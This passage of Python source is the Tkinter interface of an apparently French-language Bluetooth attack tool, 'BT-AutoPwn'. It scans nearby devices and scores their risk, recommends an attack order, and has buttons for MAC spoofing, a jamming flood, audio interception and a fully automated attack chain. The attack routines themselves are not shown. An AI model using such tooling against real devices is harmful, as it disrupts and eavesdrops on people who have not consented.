    LEVEL_COLORS = {"INFO":FG,"WARN":WARN,"SUCCESS":ACC,"ERROR":ERRR,"ATTACK":ATK}

    def gui_log(e: LogEntry):
        gui_q.put(e)
    SESSION.subscribe(gui_log)

    # ── Root ──
    root = tk.Tk()
    root.title(f"BT-AutoPwn v{VERSION}")
    root.configure(bg=BG)
    root.geometry("1280x800")
    root.minsize(1000, 680)

    # ── Global font ──
    FONT_MONO  = ("Courier New", 9)
    FONT_TITLE = ("Courier New", 13, "bold")
    FONT_BTN   = ("Courier New", 9, "bold")
    FONT_SMALL = ("Courier New", 8)

    # ── Header ──
    hdr_frame = tk.Frame(root, bg=BG, pady=4)
    hdr_frame.pack(fill=tk.X)
    tk.Label(hdr_frame, text=f"◈ BT-AutoPwn v{VERSION}  —  Bluetooth Security Framework",
             font=FONT_TITLE, fg=ACC, bg=BG).pack(side=tk.LEFT, padx=12)
    status_var = tk.StringVar(value="Initialisation...")
    tk.Label(hdr_frame, textvariable=status_var, font=FONT_SMALL, fg="#555566", bg=BG).pack(side=tk.RIGHT, padx=12)
    tk.Frame(root, bg="#1e1e2a", height=1).pack(fill=tk.X)

    # ── ttk style ──
    style = ttk.Style()
    style.theme_use("clam")
    style.configure(".", background=BG, foreground=FG, font=FONT_MONO)
    style.configure("TNotebook",        background=BG, borderwidth=0, tabmargins=[0,0,0,0])
    style.configure("TNotebook.Tab",    background=BG3, foreground="#666688", padding=[18,7],
                    font=FONT_BTN, borderwidth=0)
    style.map("TNotebook.Tab",
              background=[("selected",BG),("active",BG2)],
              foreground=[("selected",ACC),("active",FG)])
    style.configure("TSeparator",       background="#1e1e2a")
    style.configure("TScrollbar",       background=BG3, troughcolor=BG, arrowcolor="#444455")
    style.configure("Treeview",         background=BG2, foreground=FG, fieldbackground=BG2,
                    rowheight=22, font=FONT_SMALL, borderwidth=0)
    style.configure("Treeview.Heading", background=BG3, foreground=ACC2, font=FONT_BTN)
    style.map("Treeview",               background=[("selected","#1a2a1a")],
              foreground=[("selected",ACC)])

    # ── Notebook ──
    nb = ttk.Notebook(root)
    nb.pack(fill=tk.BOTH, expand=True, padx=0, pady=0)

    # ══════════════════════════════════════════════════
    # TAB 1 — SCAN
    # ══════════════════════════════════════════════════
    tab_scan = tk.Frame(nb, bg=BG)
    nb.add(tab_scan, text="  ◈ SCAN  ")

    # Left: adapter panel + controls
    scan_left = tk.Frame(tab_scan, bg=BG, width=340)
    scan_left.pack(side=tk.LEFT, fill=tk.Y, padx=(8,4), pady=8)
    scan_left.pack_propagate(False)

    # Adapter info
    def make_section_label(parent, text):
        tk.Label(parent, text=text, font=FONT_BTN, fg=ACC2, bg=BG).pack(anchor=tk.W, pady=(10,2))
        tk.Frame(parent, bg="#1e1e2a", height=1).pack(fill=tk.X)

    make_section_label(scan_left, "ADAPTATEURS")
    adapter_text = tk.Text(scan_left, bg=BG2, fg="#888899", font=FONT_SMALL,
                           height=4, state="disabled",
                           relief=tk.FLAT, bd=0, wrap=tk.NONE)
    adapter_text.pack(fill=tk.X, pady=(2,0))

    def refresh_adapter_panel():
        adapter_text.configure(state="normal"); adapter_text.delete("1.0", tk.END)
        for iface, info in ADAPTERS.adapters.items():
            col = ACC if info.up else ERRR
            adapter_text.insert(tk.END, f"  {iface}  ", "iface")
            adapter_text.insert(tk.END, f"{info.mac}  {info.dev_type:<9}  BT{info.bt_version}  {info.chip or '?'}\n")
        adapter_text.configure(state="disabled")
        adapter_text.tag_config("iface", foreground=ACC)

    refresh_adapter_panel()

    make_section_label(scan_left, "SCAN")

    scan_dur_var = tk.IntVar(value=15)
    dur_frame = tk.Frame(scan_left, bg=BG)
    dur_frame.pack(fill=tk.X, pady=2)
    tk.Label(dur_frame, text="Durée (s):", font=FONT_SMALL, fg=FG, bg=BG).pack(side=tk.LEFT)
    tk.Scale(dur_frame, from_=5, to=60, orient=tk.HORIZONTAL, variable=scan_dur_var,
             bg=BG, fg=ACC, troughcolor=BG3, highlightthickness=0, font=FONT_SMALL,
             length=180).pack(side=tk.LEFT)
    tk.Label(dur_frame, textvariable=scan_dur_var, font=FONT_SMALL, fg=ACC, bg=BG, width=3).pack(side=tk.LEFT)

    def make_btn(parent, text, cmd, color=ACC, pady=2):
        b = tk.Button(parent, text=text, font=FONT_BTN, fg=color, bg=BG2,
                      activeforeground=BG, activebackground=color,
                      relief=tk.FLAT, bd=0, pady=5, cursor="hand2",
                      command=lambda: threading.Thread(target=cmd, daemon=True).start())
        b.pack(fill=tk.X, pady=pady, padx=2)
        b.bind("<Enter>", lambda e: b.config(bg=BG3))
        b.bind("<Leave>", lambda e: b.config(bg=BG2))
        return b

    def do_scan_all():
        SESSION.info(f"Scan BLE + Classic ({scan_dur_var.get()}s)...")
        new = scan_all(scan_dur_var.get(), log_cb=lambda m: SESSION.info(m))
        seen = {d.mac for d in devices}
        for d in new:
            if d.mac not in seen: devices.append(d)
        root.after(0, refresh_device_tree)

    def do_scan_ble():
        new = scan_ble(scan_dur_var.get(), log_cb=lambda m: SESSION.info(m))
        seen = {d.mac for d in devices}
        for d in new:
            if d.mac not in seen: devices.append(d)
        root.after(0, refresh_device_tree)

    def do_scan_classic():
        new = scan_classic(scan_dur_var.get(), log_cb=lambda m: SESSION.info(m))
        seen = {d.mac for d in devices}
        for d in new:
            if d.mac not in seen: devices.append(d)
        root.after(0, refresh_device_tree)

    def do_enum_selected():
        dev = sel_dev[0]
        if not dev: SESSION.warn("Sélectionner un appareil"); return
        full_enum(dev)
        root.after(0, lambda: refresh_device_info(dev))
        SESSION.success(f"Énumération {dev.mac}: {len(dev.services)} svc, {len(dev.vulnerabilities)} vuln(s)")

    def do_clear_devices():
        devices.clear(); sel_dev[0] = None
        root.after(0, refresh_device_tree)

    make_btn(scan_left, "▶  Scan BLE + Classic  (RSSI live)", do_scan_all, ACC)
    make_btn(scan_left, "▷  Scan BLE uniquement",              do_scan_ble, ACC2)
    make_btn(scan_left, "▷  Scan BT Classic",                  do_scan_classic, ACC2)
    make_btn(scan_left, "⊕  Énumérer appareil sélectionné",    do_enum_selected, WARN)
    make_btn(scan_left, "✕  Vider la liste",                   do_clear_devices, "#555566")

    # Device info panel
    make_section_label(scan_left, "APPAREIL SÉLECTIONNÉ")
    dev_info_text = tk.Text(scan_left, bg=BG2, fg=FG, font=FONT_SMALL,
                            height=9, state="disabled", relief=tk.FLAT, bd=0, wrap=tk.WORD)
    dev_info_text.pack(fill=tk.X, pady=(2,0))

    def refresh_device_info(dev: BTDevice):
        dev_info_text.configure(state="normal"); dev_info_text.delete("1.0", tk.END)
        if not dev:
            dev_info_text.insert(tk.END, "  Aucun appareil sélectionné")
            dev_info_text.configure(state="disabled"); return
        lines = [
            f"  MAC:      {dev.mac}",
            f"  Nom:      {dev.name}",
            f"  Type:     {dev.dev_type}",
            f"  Fabricant:{dev.manufacturer or '?'}",
            f"  RSSI:     {dev.rssi}dBm" if dev.rssi else "  RSSI:     N/A",
            f"  LMP:      {dev.lmp_version[:30] or '?'}",
            f"  Services: {len(dev.services)}",
            f"  Vulns:    {len(dev.vulnerabilities)}",
        ]
        for line in lines:
            dev_info_text.insert(tk.END, line+"\n")
        if dev.vulnerabilities:
            dev_info_text.insert(tk.END, "\n  ⚠ Vulnérabilités:\n", "vuln_hdr")
            for v in dev.vulnerabilities[:4]:
                dev_info_text.insert(tk.END, f"    • {v}\n", "vuln")
        dev_info_text.configure(state="disabled")
        dev_info_text.tag_config("vuln_hdr", foreground=ERRR)
        dev_info_text.tag_config("vuln",     foreground=WARN)

    # Right: device tree
    scan_right = tk.Frame(tab_scan, bg=BG)
    scan_right.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(4,8), pady=8)

    tk.Label(scan_right, text="APPAREILS DÉTECTÉS", font=FONT_BTN, fg=ACC2, bg=BG).pack(anchor=tk.W)
    tk.Frame(scan_right, bg="#1e1e2a", height=1).pack(fill=tk.X, pady=(2,4))

    tree_frame = tk.Frame(scan_right, bg=BG)
    tree_frame.pack(fill=tk.BOTH, expand=True)

    cols = ("mac","name","type","mfr","rssi","risk","vulns","services","first_seen")
    tree = ttk.Treeview(tree_frame, columns=cols, show="headings", selectmode="browse")
    headers = {"mac":"MAC","name":"Nom","type":"Type","mfr":"Fabricant",
               "rssi":"RSSI","risk":"RISQUE","vulns":"Vulns","services":"Svcs","first_seen":"Vu à"}
    widths  = {"mac":130,"name":155,"type":65,"mfr":95,"rssi":65,"risk":70,"vulns":45,"services":45,"first_seen":55}
    for c in cols:
        tree.heading(c, text=headers[c])
        tree.column(c, width=widths[c], anchor=tk.CENTER if c in ("rssi","risk","vulns","services","type") else tk.W)
    tree.tag_configure("critical", foreground="#ff2244")
    tree.tag_configure("high",     foreground=ATK)
    tree.tag_configure("medium",   foreground=WARN)
    tree.tag_configure("normal",   foreground=FG)

    vsb = ttk.Scrollbar(tree_frame, orient="vertical",   command=tree.yview)
    hsb = ttk.Scrollbar(tree_frame, orient="horizontal", command=tree.xview)
    tree.configure(yscrollcommand=vsb.set, xscrollcommand=hsb.set)
    tree.grid(row=0, column=0, sticky="nsew")
    vsb.grid(row=0, column=1, sticky="ns")
    hsb.grid(row=1, column=0, sticky="ew")
    tree_frame.grid_rowconfigure(0, weight=1); tree_frame.grid_columnconfigure(0, weight=1)

    def refresh_device_tree():
        tree.delete(*tree.get_children())
        for d in devices:
            vuln_n   = len(d.vulnerabilities)
            sc       = risk_score(d)
            tag = "critical" if sc >= 75 else "high" if sc >= 50 else "medium" if sc >= 25 else "normal"
            rssi_str = f"{d.rssi:+d}dBm" if d.rssi else "N/A"
            risk_str = f"{sc}/100"
            tree.insert("", tk.END, iid=d.mac,
                        values=(d.mac,d.name,d.dev_type,d.manufacturer or "-",
                                rssi_str,risk_str,str(vuln_n),str(len(d.services)),d.first_seen),
                        tags=(tag,))

    # ── CONSEILS panel in SCAN left pane ──
    make_section_label(scan_left, "CONSEILS — ANALYSE APPAREIL")
    conseils_text = tk.Text(scan_left, bg="#0d1117", fg="#c8d8c8", font=FONT_SMALL,
                            height=11, state="disabled", relief=tk.FLAT, bd=0,
                            wrap=tk.WORD, padx=6, pady=4)
    conseils_text.pack(fill=tk.BOTH, expand=True, pady=(2,0))
    conseils_text.tag_config("tip_icon",  foreground=ACC)
    conseils_text.tag_config("tip_warn",  foreground=WARN)
    conseils_text.tag_config("tip_err",   foreground=ERRR)
    conseils_text.tag_config("order_hdr", foreground=ACC2)
    conseils_text.tag_config("order",     foreground="#99bbcc")

    # Frame pour les boutons d'action sous CONSEILS
    scan_actions_frame = tk.Frame(scan_left, bg=BG)
    scan_actions_frame.pack(fill=tk.X, pady=(2,0))

    def refresh_conseils(dev: BTDevice):
        conseils_text.configure(state="normal"); conseils_text.delete("1.0", tk.END)
        # Clear action buttons
        for w in scan_actions_frame.winfo_children(): w.destroy()

        if not dev:
            conseils_text.insert(tk.END, "  Sélectionner un appareil pour obtenir des conseils.", "tip_icon")
            conseils_text.configure(state="disabled"); return

        score = risk_score(dev)
        sc    = risk_color(score)
        conseils_text.insert(tk.END, f"  Score de risque : {score}/100\n", "tip_warn" if score >= 50 else "tip_icon")

        tips = ADVISOR.assess_device(dev)
        for tip in tips:
            icon = "tip_err" if tip.startswith(("❌","🚨","🔥")) else \
                   "tip_warn" if tip.startswith(("⚠️","⌨️")) else "tip_icon"
            conseils_text.insert(tk.END, tip + "\n", icon)

        conseils_text.insert(tk.END, "\n")
        conseils_text.insert(tk.END, "◈ ORDRE D'ATTAQUE RECOMMANDÉ\n", "order_hdr")
        for line in ADVISOR.attack_order(dev).split("\n"):
            conseils_text.insert(tk.END, "  " + line + "\n", "order")
        conseils_text.configure(state="disabled")

        # Boutons d'action cliquables
        actions = tips_to_actions(tips)
        if actions:
            tk.Label(scan_actions_frame, text="Actions suggérées :", font=FONT_SMALL,
                     fg="#555566", bg=BG).pack(anchor=tk.W, pady=(4,1))
            btn_row = tk.Frame(scan_actions_frame, bg=BG)
            btn_row.pack(fill=tk.X)
            for label, aid in actions[:5]:
                _a, _d = aid, dev
                col_btn = CAT_COLOR.get(ATTACKS.get(aid,{}).get("cat","Recon"), ACC)
                b = tk.Button(btn_row, text=f"▶ {label[:16]}", font=("Courier New",7,"bold"),
                              fg=col_btn, bg=BG2, relief=tk.FLAT, bd=0, padx=5, pady=3,
                              cursor="hand2",
                              command=lambda a=_a, d=_d: threading.Thread(
                                  target=do_attack_scan, args=(a,d), daemon=True).start())
                b.pack(side=tk.LEFT, padx=(0,3), pady=2)
                b.bind("<Enter>", lambda e, btn=b, c=col_btn: btn.config(bg=BG3))
                b.bind("<Leave>", lambda e, btn=b: btn.config(bg=BG2))

    refresh_conseils(None)

    def on_tree_select(evt):
        sel = tree.selection()
        if not sel: return
        mac = sel[0]
        for d in devices:
            if d.mac == mac:
                sel_dev[0] = d
                refresh_device_info(d)
                refresh_conseils(d)
                break

    tree.bind("<<TreeviewSelect>>", on_tree_select)

    # ══════════════════════════════════════════════════
    # TAB 2 — ATTACKS
    # ══════════════════════════════════════════════════
    tab_atk = tk.Frame(nb, bg=BG)
    nb.add(tab_atk, text="  ⚡ ATTACKS  ")

    atk_left = tk.Frame(tab_atk, bg=BG, width=360)
    atk_left.pack(side=tk.LEFT, fill=tk.Y, padx=(8,4), pady=8)
    atk_left.pack_propagate(False)

    # Target display
    make_section_label(atk_left, "CIBLE ACTIVE")
    target_var = tk.StringVar(value="Aucune cible — sélectionner dans SCAN")
    target_lbl = tk.Label(atk_left, textvariable=target_var, font=FONT_SMALL,
                          fg=ACC, bg=BG2, anchor=tk.W, padx=8, pady=5, wraplength=320)
    target_lbl.pack(fill=tk.X)

    def update_target_display():
        dev = sel_dev[0]
        if dev:
            target_var.set(f"  {dev.mac}  {dev.name}\n  {dev.dev_type}  RSSI={dev.rssi}dBm  Vulns={len(dev.vulnerabilities)}")
        root.after(1000, update_target_display)

    # Smart adapter hint
    make_section_label(atk_left, "ADAPTATEUR AUTO-SÉLECTIONNÉ")
    iface_hints = tk.Text(atk_left, bg=BG2, fg="#666688", font=FONT_SMALL,
                          height=4, state="disabled", relief=tk.FLAT, bd=0)
    iface_hints.pack(fill=tk.X)

    def refresh_iface_hints():
        iface_hints.configure(state="normal"); iface_hints.delete("1.0", tk.END)
        for cap in ["ble","classic","any"]:
            iface = ADAPTERS.best(cap) or "?"
            iface_hints.insert(tk.END, f"  {cap:<10} → {iface}\n")
        iface_hints.configure(state="disabled")

    refresh_iface_hints()

    # Stealth
    make_section_label(atk_left, "STEALTH")

    def do_mac_spoof():
        fake = simpledialog.askstring("MAC Spoof","Nouvelle MAC (vide=aléatoire):",initialvalue="") or ""
        r = atk_mac_spoof(fake=fake or None)
        SESSION.info(r)

    def do_alias_loop():
        dur = simpledialog.askinteger("Alias Loop","Durée (s):",initialvalue=30,minvalue=5) or 30
        threading.Thread(target=atk_alias_loop, kwargs={"duration":dur}, daemon=True).start()
        SESSION.success(f"Alias loop {dur}s démarrée")

    make_btn(atk_left, "MAC Spoof  (aléatoire / custom)",    do_mac_spoof, "#aa44ff")
    make_btn(atk_left, "Broadcast Alias Loop  (identités BT)",do_alias_loop,"#aa44ff")
    make_btn(atk_left, "Stop Alias Loop",                     _alias_stop.set,"#553355")

    # ZeroJam standalone
    make_section_label(atk_left, "ZEROJAM STANDALONE")

    def do_zerojam_global():
        dur   = simpledialog.askinteger("ZeroJam","Durée flood (s):",initialvalue=30) or 30
        iface = ADAPTERS.best("ble") or "hci0"
        threading.Thread(target=_zerojam_run, args=(iface, dur), daemon=True).start()
        SESSION.attack(f"ZeroJam broadcast {dur}s")

    make_btn(atk_left, "ZeroJam Broadcast Flood",  do_zerojam_global, ERRR)
    make_btn(atk_left, "Stop ZeroJam",              _zerojam_stop.set, "#553333")

    # Audio stop
    make_section_label(atk_left, "AUDIO INTERCEPT CONTROL")

    def do_stop_audio():
        dev = sel_dev[0]
        if not dev: SESSION.warn("Aucune cible sélectionnée"); return
        r = stop_audio_intercept(dev.mac)
        SESSION.info(r)

    make_btn(atk_left, "Stop Audio + Cleanup BT", do_stop_audio, WARN)

    # Full Auto Chain
    make_section_label(atk_left, "FULL AUTO CHAIN")
    _chain_stop = threading.Event()
    chain_status_var = tk.StringVar(value="")

    chain_prog = tk.Text(atk_left, bg="#090f09", fg=ACC, font=("Courier New",7),
                         height=5, state="disabled", relief=tk.FLAT, bd=0, wrap=tk.WORD)
    chain_prog.pack(fill=tk.X, pady=(2,4))
    chain_prog.tag_config("step",    foreground=ACC)
    chain_prog.tag_config("ok",      foreground="#39ff14")
    chain_prog.tag_config("warn",    foreground=WARN)
    chain_prog.tag_config("running", foreground=ACC2)

    def _chain_log(label: str, detail: str):
        def _w():
            chain_prog.configure(state="normal")
            tag = "ok" if label.startswith("✓") else "warn" if label.startswith("⚠") else "running" if "▶" in label else "step"
            chain_prog.insert(tk.END, label + "\n", tag)
            chain_prog.see(tk.END)
            chain_prog.configure(state="disabled")
        root.after(0, _w)

    def do_auto_chain():
        dev = sel_dev[0]
        if not dev:
            SESSION.warn("Full Auto Chain : sélectionner une cible dans SCAN")
            messagebox.showwarning("Pas de cible", "Sélectionner un appareil dans SCAN d'abord.")
            return
        _chain_stop.clear()
        chain_prog.configure(state="normal"); chain_prog.delete("1.0",tk.END); chain_prog.configure(state="disabled")
        SESSION.attack(f"[AUTO CHAIN] Démarrage sur {dev.name} ({dev.mac})")
        results = auto_chain(dev, progress_cb=_chain_log, stop_evt=_chain_stop)
        atk_results.setdefault(dev.mac, {}).update(results)
        SESSION.success(f"[AUTO CHAIN] Terminé — {len(results)} attaques")
        root.after(0, refresh_summary)

    def do_stop_chain():
        _chain_stop.set()
        _chain_log("⚠ Arrêt demandé...", "")

    # Helper accessible depuis refresh_conseils (SCAN tab)
    def do_attack_scan(aid: str, dev: BTDevice):
        if not dev: return
        _show_explanation(aid)
        result = run_attack(aid, dev)
        atk_results.setdefault(dev.mac, {})[aid] = result
        atk_result_var.set(f"[{ATTACKS[aid]['name']}]\n{result[:600]}")
        root.after(0, lambda: _show_post_conseils(aid, result))

    make_btn(atk_left, "⚡ FULL AUTO CHAIN  (séquence automatique)", do_auto_chain, "#39ff14", 2)
    make_btn(atk_left, "■  Stopper la chaîne",                       do_stop_chain, "#553333", 1)

    # Right: attack categories
    atk_right = tk.Frame(tab_atk, bg=BG)
    atk_right.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(4,8), pady=8)

    # Group attacks by category
    cats = {}
    for aid, a in ATTACKS.items():
        cats.setdefault(a["cat"], []).append((aid, a))

    # Scrollable attack canvas
    atk_canvas = tk.Canvas(atk_right, bg=BG, highlightthickness=0)
    atk_vsb    = ttk.Scrollbar(atk_right, orient="vertical", command=atk_canvas.yview)
    atk_inner  = tk.Frame(atk_canvas, bg=BG)
    atk_inner.bind("<Configure>", lambda e: atk_canvas.configure(scrollregion=atk_canvas.bbox("all")))
    atk_canvas.create_window((0,0), window=atk_inner, anchor="nw")
    atk_canvas.configure(yscrollcommand=atk_vsb.set)
    # canvas packed below — after atk_bottom — so bottom panel gets space first

    atk_result_var = tk.StringVar(value="")
    _last_aid = [None]

    def _show_explanation(aid: str):
        """Affiche l'explication de l'attaque avant de la lancer."""
        if aid not in EXPLANATIONS: return
        ex = EXPLANATIONS[aid]
        expl_text.configure(state="normal"); expl_text.delete("1.0", tk.END)
        expl_text.insert(tk.END, f"◈ {ex['titre']}\n\n", "expl_titre")
        expl_text.insert(tk.END, "QUE FAIT CETTE ATTAQUE ?\n", "expl_hdr")
        expl_text.insert(tk.END, ex["quoi"] + "\n\n", "expl_body")
        expl_text.insert(tk.END, "COMMENT ÇA FONCTIONNE ?\n", "expl_hdr")
        expl_text.insert(tk.END, ex["comment"] + "\n\n", "expl_dim")
        expl_text.insert(tk.END, "QUE CHERCHER DANS LE RÉSULTAT ?\n", "expl_hdr")
        expl_text.insert(tk.END, ex["chercher"] + "\n\n", "expl_body")
        expl_text.insert(tk.END, "⚠ CONSEIL AVANT LANCEMENT\n", "expl_warn")
        expl_text.insert(tk.END, ex["conseil_avant"] + "\n", "expl_dim")
        expl_text.configure(state="disabled")

    def _show_post_conseils(aid: str, result: str):
        """Affiche les conseils contextuels après une attaque + boutons d'action."""
        post_tips = ADVISOR.after_attack(aid, result)
        post_text.configure(state="normal"); post_text.delete("1.0", tk.END)
        post_text.insert(tk.END, "ANALYSE DU RÉSULTAT\n\n", "post_hdr")
        for tip in post_tips:
            tag = "post_err"  if tip.startswith(("❌","🚨")) else \
                  "post_warn" if tip.startswith(("⚠️","🔍")) else \
                  "post_ok"   if tip.startswith("✅") else "post_tip"
            post_text.insert(tk.END, tip + "\n", tag)
        if aid in EXPLANATIONS:
            post_text.insert(tk.END, "\n💡 " + EXPLANATIONS[aid]["conseil_apres"] + "\n", "post_tip")
        post_text.configure(state="disabled")

        # Boutons d'action suite
        for w in post_actions_frame.winfo_children(): w.destroy()
        actions = tips_to_actions(post_tips)
        if actions:
            for label, next_aid in actions[:4]:
                _a = next_aid
                col_btn = CAT_COLOR.get(ATTACKS.get(next_aid,{}).get("cat","Recon"), ACC)
                b = tk.Button(post_actions_frame,
                              text=f"▶ {label[:18]}", font=("Courier New",7,"bold"),
                              fg=col_btn, bg=BG2, relief=tk.FLAT, bd=0, padx=6, pady=3,
                              cursor="hand2",
                              command=lambda a=_a: threading.Thread(
                                  target=do_attack, args=(a,), daemon=True).start())
                b.pack(side=tk.LEFT, padx=(0,3), pady=2)
                b.bind("<Enter>", lambda e, btn=b, c=col_btn: btn.config(bg=BG3))
                b.bind("<Leave>", lambda e, btn=b: btn.config(bg=BG2))

    def do_attack(aid):
        dev = sel_dev[0]
        if not dev:
            SESSION.warn(f"{ATTACKS[aid]['name']}: aucune cible — sélectionner dans SCAN")
            messagebox.showwarning("Pas de cible", "Sélectionner un appareil dans l'onglet SCAN d'abord.")
            return
        _last_aid[0] = aid
        root.after(0, lambda: _show_explanation(aid))
        result = run_attack(aid, dev)
        atk_results.setdefault(dev.mac, {})[aid] = result
        atk_result_var.set(f"[{ATTACKS[aid]['name']}]\n{result[:600]}")
        root.after(0, lambda: _show_post_conseils(aid, result))

    cat_order = ["Recon","Exploit","Audio","DoS","CVE"]
    for cat in cat_order:
        if cat not in cats: continue
        col = CAT_COLOR.get(cat, FG)
        tk.Label(atk_inner, text=f"── {cat.upper()} ──", font=FONT_BTN,
                 fg=col, bg=BG).pack(anchor=tk.W, pady=(10,2), padx=4)
        tk.Frame(atk_inner, bg="#1e1e2a", height=1).pack(fill=tk.X, padx=4)

        for aid, a in cats[cat]:
            row = tk.Frame(atk_inner, bg=BG2, pady=2)
            row.pack(fill=tk.X, padx=4, pady=1)

            sev_col = SEV_COLOR.get(a["sev"], FG)
            sev_dot = tk.Label(row, text="●", font=FONT_SMALL, fg=sev_col, bg=BG2, width=2)
            sev_dot.pack(side=tk.LEFT, padx=(6,2))

            cap_iface = ADAPTERS.best(a["cap"]) or "hci0"
            tk.Label(row, text=f"{a['name']}", font=FONT_BTN, fg=col, bg=BG2, anchor=tk.W, width=28).pack(side=tk.LEFT)
            tk.Label(row, text=f"[{cap_iface}]", font=FONT_SMALL, fg="#555566", bg=BG2, width=7).pack(side=tk.LEFT)
            tk.Label(row, text=a["desc"], font=FONT_SMALL, fg="#666677", bg=BG2, anchor=tk.W).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(4,0))

            _aid = aid
            btn_run = tk.Button(row, text="▶ RUN", font=FONT_SMALL, fg=col, bg=BG3,
                                activeforeground=BG, activebackground=col,
                                relief=tk.FLAT, bd=0, padx=8, cursor="hand2",
                                command=lambda a=_aid: threading.Thread(target=do_attack, args=(a,), daemon=True).start())
            btn_run.pack(side=tk.RIGHT, padx=4)
            btn_run.bind("<Enter>", lambda e, a=_aid: root.after(0, lambda: _show_explanation(a)))

    # ── Lower panel: result / explication / conseils ──
    # Packed BEFORE canvas so tkinter reserves bottom space first
    atk_bottom = tk.Frame(atk_right, bg=BG)
    atk_bottom.pack(fill=tk.X, side=tk.BOTTOM, pady=(4,0))

    # NOW pack the canvas so it fills remaining space above atk_bottom
    atk_canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
    atk_vsb.pack(side=tk.RIGHT, fill=tk.Y)

    # Row 1: DERNIER RÉSULTAT
    tk.Frame(atk_bottom, bg="#1e1e2a", height=1).pack(fill=tk.X, pady=(4,0))
    tk.Label(atk_bottom, text="DERNIER RÉSULTAT", font=FONT_BTN, fg="#555566", bg=BG).pack(anchor=tk.W, padx=4)
    result_box = tk.Text(atk_bottom, bg=BG2, fg=ACC, font=FONT_SMALL, height=4,
                         state="disabled", relief=tk.FLAT, bd=0, wrap=tk.WORD)
    result_box.pack(fill=tk.X, padx=4, pady=2)

    def _update_result_box(*_):
        val = atk_result_var.get()
        result_box.configure(state="normal"); result_box.delete("1.0", tk.END)
        result_box.insert(tk.END, val); result_box.configure(state="disabled")
    atk_result_var.trace_add("write", _update_result_box)

    # Row 2: EXPLICATION + CONSEILS side by side
    expl_conseil_frame = tk.Frame(atk_bottom, bg=BG)
    expl_conseil_frame.pack(fill=tk.X, pady=(4,0))

    # Left: EXPLICATION
    expl_frame = tk.Frame(expl_conseil_frame, bg=BG)
    expl_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(4,2))
    tk.Frame(expl_frame, bg="#1e2e2e", height=1).pack(fill=tk.X)
    tk.Label(expl_frame, text="📖 EXPLICATION", font=FONT_BTN, fg=ACC2, bg=BG).pack(anchor=tk.W)
    expl_text = tk.Text(expl_frame, bg="#090f0f", fg="#aaccaa", font=("Courier New",8),
                        height=9, state="disabled", relief=tk.FLAT, bd=0,
                        wrap=tk.WORD, padx=5, pady=4)
    expl_text.pack(fill=tk.BOTH, expand=True)
    expl_text.tag_config("expl_titre", foreground=ACC,  font=("Courier New",8,"bold"))
    expl_text.tag_config("expl_hdr",   foreground=ACC2, font=("Courier New",8,"bold"))
    expl_text.tag_config("expl_body",  foreground="#aaccaa")
    expl_text.tag_config("expl_dim",   foreground="#667766")
    expl_text.tag_config("expl_warn",  foreground=WARN, font=("Courier New",8,"bold"))
    expl_text.configure(state="normal")
    expl_text.insert(tk.END, "  Cliquer ▶ RUN sur une attaque pour voir son explication ici.")
    expl_text.configure(state="disabled")

    # Right: CONSEILS ACTIFS
    post_frame = tk.Frame(expl_conseil_frame, bg=BG)
    post_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(2,4))
    tk.Frame(post_frame, bg="#1e1e2e", height=1).pack(fill=tk.X)
    tk.Label(post_frame, text="🎯 CONSEILS ACTIFS", font=FONT_BTN, fg="#aa44ff", bg=BG).pack(anchor=tk.W)
    post_text = tk.Text(post_frame, bg="#0a0910", fg="#ccaaee", font=("Courier New",8),
                        height=9, state="disabled", relief=tk.FLAT, bd=0,
                        wrap=tk.WORD, padx=5, pady=4)
    post_text.pack(fill=tk.BOTH, expand=True)
    post_text.tag_config("post_hdr",  foreground="#aa44ff", font=("Courier New",8,"bold"))
    post_text.tag_config("post_ok",   foreground=ACC)
    post_text.tag_config("post_warn", foreground=WARN)
    post_text.tag_config("post_err",  foreground=ERRR)
    post_text.tag_config("post_tip",  foreground="#ccaaee")
    post_text.configure(state="normal")
    post_text.insert(tk.END, "  Les conseils apparaîtront ici après chaque attaque.")
    post_text.configure(state="disabled")

    # Boutons next-step sous CONSEILS ACTIFS
    post_actions_frame = tk.Frame(post_frame, bg=BG)
    post_actions_frame.pack(fill=tk.X, pady=(2,0))

    # ══════════════════════════════════════════════════
    # TAB 3 — CONSOLE
    # ══════════════════════════════════════════════════
    tab_log = tk.Frame(nb, bg=BG)
    nb.add(tab_log, text="  ▣ CONSOLE  ")

    log_ctrl = tk.Frame(tab_log, bg=BG)
    log_ctrl.pack(fill=tk.X, padx=8, pady=(6,2))
    tk.Label(log_ctrl, text="LIVE CONSOLE", font=FONT_BTN, fg=ACC2, bg=BG).pack(side=tk.LEFT)

    def do_clear_log():
        term.configure(state="normal"); term.delete("1.0", tk.END); term.configure(state="disabled")

    tk.Button(log_ctrl, text="Effacer", font=FONT_SMALL, fg="#555566", bg=BG2,
              relief=tk.FLAT, bd=0, padx=8, command=do_clear_log).pack(side=tk.RIGHT)

    term = scrolledtext.ScrolledText(tab_log, state="disabled", bg="#080810", fg=FG,
                                     font=("Courier New",9), relief=tk.FLAT, bd=0,
                                     insertbackground=ACC)
    term.pack(fill=tk.BOTH, expand=True, padx=8, pady=(0,8))
    for lvl, col in LEVEL_COLORS.items():
        term.tag_config(lvl, foreground=col)
    term.tag_config("ts", foreground="#333344")

    def write_log(e: LogEntry):
        term.configure(state="normal")
        term.insert(tk.END, f"[{e.ts}] ", "ts")
        term.insert(tk.END, f"{e.msg}\n", e.level)
        term.see(tk.END)
        term.configure(state="disabled")

    # ══════════════════════════════════════════════════
    # TAB 4 — SESSION
    # ══════════════════════════════════════════════════
    tab_sess = tk.Frame(nb, bg=BG)
    nb.add(tab_sess, text="  ⬡ SESSION  ")

    sess_inner = tk.Frame(tab_sess, bg=BG)
    sess_inner.pack(fill=tk.BOTH, expand=True, padx=24, pady=16)

    tk.Label(sess_inner, text="EXPORT & SESSION", font=FONT_TITLE, fg=ACC2, bg=BG).pack(anchor=tk.W)
    tk.Frame(sess_inner, bg="#1e1e2a", height=1).pack(fill=tk.X, pady=(4,16))

    export_status = tk.StringVar(value="")

    def do_export():
        if not devices:
            SESSION.warn("Aucun appareil à exporter"); return
        paths = export_session(devices, atk_results)
        export_status.set("Exporté:\n" + "\n".join(f"  {k.upper()}: {v}" for k,v in paths.items()))
        SESSION.success("Session exportée")

    def do_open_logs():
